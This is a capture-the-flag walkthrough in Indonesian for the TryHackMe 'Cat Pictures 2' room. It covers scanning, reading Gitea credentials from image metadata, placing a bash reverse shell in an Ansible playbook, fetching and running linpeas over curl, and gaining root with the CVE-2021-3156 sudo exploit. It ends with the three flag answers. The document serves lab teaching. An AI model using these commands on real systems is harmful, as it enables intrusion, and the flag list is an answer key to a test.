# Cat Pictures 2
- TryHackMe Challenge: https://tryhackme.com/room/catpictures2
- IP Machine: 10.10.154.180

## Nmap Report
- Baris perintah: `nmap -sV -sC -A <IP Machine>`
```sh
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -A 10.10.154.180
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-22 20:41 EDT
Nmap scan report for 10.10.154.180
Host is up (0.22s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33f0033626368c2f88952cacc3bc6465 (RSA)
|   256 4ff3b3f26e0391b27cc053d5d4038846 (ECDSA)
|_  256 137c478b6ff8f46b429af2d53d341352 (ED25519)
80/tcp   open  http    nginx 1.4.6 (Ubuntu)
|_http-server-header: nginx/1.4.6 (Ubuntu)
| http-git: 
|   10.10.154.180:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|       https://github.com/electerious/Lychee.git
|_    Project type: PHP application (guessed from .gitignore)
| http-robots.txt: 7 disallowed entries 
|_/data/ /dist/ /docs/ /php/ /plugins/ /src/ /uploads/
|_http-title: Lychee
222/tcp  open  ssh     OpenSSH 9.0 (protocol 2.0)
| ssh-hostkey: 
|   256 becb061f330f6006a05a06bf065333c0 (ECDSA)
|_  256 9f0798926efd2c2db093fafee8950c37 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: no-store, no-transform
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: i_like_gitea=31489660ee805218; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=oIzooACBKSzT0INFUwG7zy0SH946MTY5NTQyOTczODg0ODI2MTE4NQ; Path=/; Expires=Sun, 24 Sep 2023 00:42:18 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 23 Sep 2023 00:42:18 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title> Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Cache-Control: no-store, no-transform
|     Set-Cookie: i_like_gitea=33c5800b0fe43ee5; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=C1MnjnmSDlyV8CfdiVGEr92Z75w6MTY5NTQyOTc0NTE0ODk1MzIxMA; Path=/; Expires=Sun, 24 Sep 2023 00:42:25 GMT; HttpOnly; SameSite=Lax
|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 23 Sep 2023 00:42:25 GMT
|_    Content-Length: 0
8080/tcp open  http    SimpleHTTPServer 0.6 (Python 3.6.9)
|_http-server-header: SimpleHTTP/0.6 Python/3.6.9
|_http-title: Welcome to nginx!
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.93%I=7%D=9/22%Time=650E3468%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,2DE8,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:
SF:\x20no-store,\x20no-transform\r\nContent-Type:\x20text/html;\x20charset
SF:=UTF-8\r\nSet-Cookie:\x20i_like_gitea=31489660ee805218;\x20Path=/;\x20H
SF:ttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=oIzooACBKSzT0INFUwG7zy
SF:0SH946MTY5NTQyOTczODg0ODI2MTE4NQ;\x20Path=/;\x20Expires=Sun,\x2024\x20S
SF:ep\x202023\x2000:42:18\x20GMT;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cook
SF:ie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;\x20HttpOnly;\x20SameSit
SF:e=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Sat,\x2023\x20Sep\x
SF:202023\x2000:42:18\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en
SF:-US\"\x20class=\"theme-\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<m
SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
SF:ale=1\">\n\t<title>\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea</
SF:title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:application/json;bas
SF:e64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWU
SF:iOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2
SF:xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi")%r(Help,67,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charse
SF:t=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOp
SF:tions,1C2,"HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nCache-Contro
SF:l:\x20no-store,\x20no-transform\r\nSet-Cookie:\x20i_like_gitea=33c5800b
SF:0fe43ee5;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_cs
SF:rf=C1MnjnmSDlyV8CfdiVGEr92Z75w6MTY5NTQyOTc0NTE0ODk1MzIxMA;\x20Path=/;\x
SF:20Expires=Sun,\x2024\x20Sep\x202023\x2000:42:25\x20GMT;\x20HttpOnly;\x2
SF:0SameSite=Lax\r\nSet-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0
SF:;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDat
SF:e:\x20Sat,\x2023\x20Sep\x202023\x2000:42:25\x20GMT\r\nContent-Length:\x
SF:200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.72 seconds
```

## Content Discovery
- Buka halaman web `http://<IP_machine>` di browser

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%201.JPG)

- Buka album public

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%202.JPG)

- Setelah itu klik gambar pertama dan klik about. Disini terdapat indikasi bahwa didalam gambar tersebut terdapat sebuah note. Jadi kita akan download gambar ini

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%203.png)

- Klik tombol share dan pilih Direct Link

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%204.jpg)

- Maka akan diarahkan ke url gambar

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%205.JPG)

- Copy link gambar tersebut kemudian download menggunakan tool `wget`
```sh
wget http://<IP_machine>/uploads/big/f5054e97620f168c7b5088c85ab1d6e4.jpg 
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%206.JPG)

- Gunakan `exiftool` untuk memeriksanya
```sh
exiftool f5054e97620f168c7b5088c85ab1d6e4.jpg 
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%207.JPG)

- Sekarang kita buka url `http://IP_machine:8080/764efa883dda1e11db47671c4a3bbd9e.txt` di browser. Disini terdapat informasi username dan password untuk mengakses gitea dan terdapat halaman ansible yang berada di port 1337

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%208.JPG)

## Gain Access
- Buka url `http://<IP_machine>:3000` di browser lalu klik **Sign in**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%209.JPG)

- Login dengan username dan password yang sudah tersedia

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2010.JPG)

- Setelah login berhasil klik tautan repository

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2011.jpg)

- Disini kita berhasil menemukan flag pertama yaitu file **flag1.txt**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2012.JPG)

- Double klik file tersebut untuk membukanya

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2013.JPG)

- Sekarang kita buka halaman ansible dengan url `http://<IP_machine>:1337` di tab baru. Disini terdapat menu **Run Ansible Playbook**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2014.JPG)

- Jika kita lihat isi file **playbook.yaml** berisi command **whoami**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2015.JPG)

- Klik menu **Run Ansible Playbook** kemudian tunggu hingga proses eksekusi selesai. Setelah itu pindah ke tab **Logs** maka di keterangan **stdout** tertulis **bismuth** yang merupakan nama user saat ini

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2016.JPG)

- Dari sini kita bisa menyisipkan reverse shell ke file **playbook.yaml** di gitea kemudian menjalankannya dengan menu **Run Ansible Playbook** di halaman ansible
- Pertama-tama kita buat sebuah listener diterminal sebagai berikut
```sh
nc -lnvp <port>
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2017.JPG)

- Edit file **playbook.yaml**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2018.png)

- Sisipan reverse shell pada bagian command dan sesuaikan dengan IP di komputer anda
```sh
bash -c "bash -i >& /dev/tcp/IP_tun0/9000 0>&1"
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2019.JPG)

- Isi keterangan commit dengan "Update" lalu tekan tombol Commit Changes untuk menyimpan perubahan

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2020.JPG)

- Klik menu **Run Ansible Playbook** untuk menjalankan

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2021.jpg)

- Netcat berhasil terkoneksi dan masuk sebagai bismuth

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2022.JPG)

- Kita berhasil menemukan file **flag2.txt** di path **/home/bismuth**
```sh
cat /home/bismuth/flag2.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2023.JPG)

## Privilege Escalation
- Download file linpeas.sh di https://github.com/carlospolop/PEASS-ng/releases di local
- Serving file tersebut dengan python3 di terminal baru
```sh
python3 -m http.server 80
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2024.JPG)

- Download dan eksekusi file tersebut dengan curl di server
```sh
curl -L http://IP_tun0/linpeas.sh | sh
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2025.JPG)

- Disini terdapat informasi bahwa server menggunakan sudo versi 1.8.21p2

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2026.JPG)

- Kita dapat memanfaatkan script di https://github.com/blasty/CVE-2021-3156 untuk mengeskalasi user root
- Download file tersebut ke local dengan git clone
```sh
git clone https://github.com/blasty/CVE-2021-3156.git
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2027.JPG)

- Zip file tersebut dengan tar
```sh
tar -cvf exploit.tar CVE-2021-3156
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2028.JPG)

- Serving file zip tersebut dengan python3
```sh
python3 -m http.server 80
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2029.JPG)

- Download dan ekstrak zip tersebut ke server
```sh
cd /tmp
wget http://IP_tun0/exploit.tar
tar xopf exploit.tar
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2030.JPG)

- Build file tersebut
```sh
cd CVE-2021-3156
make
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2031.JPG)

- Eksekusi executable file yang berhasil dibuat untuk mendapatkan akses root
```sh
./sudo-hax-me-a-sandwich
./sudo-hax-me-a-sandwich 0
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2032.JPG)

- Buka file **flag3.txt** yang berada di directory root
```sh
cat /root/flag3.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Cat%20Pictures%202/assets/cp%2033.JPG)

## Task 2 Flags!

- **Pertanyaan:** What is Flag 1?
```sh
10d916eaea54bb5ebe36b59538146bb5
```

- **Pertanyaan:** What is Flag 2?
```sh
5e2cafbbf180351702651c09cd797920
```

- **Pertanyaan:** What is Flag 3?
```sh
6d2a9f8f8174e86e27d565087a28a971
```